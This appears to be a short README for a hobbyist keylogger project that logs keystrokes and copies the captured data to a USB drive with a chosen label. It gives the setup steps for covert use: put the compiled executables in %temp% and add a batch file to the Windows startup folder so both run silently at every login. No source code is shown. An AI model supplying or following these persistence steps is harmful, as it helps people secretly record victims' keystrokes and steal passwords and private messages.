# keylogg-scanning4pendrive
check out my new better keylogger


simple keylogger + a program which scans is in PC drive what name is 'something in code' and then copy it to your drive

U have to set ur pendrive name in checking.cpp in checkDriveLabel() on bottom of the file

After compile put compiled main.cpp & checking.cpp in %temp%. Then press win + r write `shell:startup`. 
In window which opened create new .bat file, paste there it: 
    ```batch
    cd %temp% 
    start (name of first exe file, default main.exe) main.exe

    start (name of second exe file, default checking.exe) checking.exe
```
Done.

Keylogger is 95% made by EgeBalci
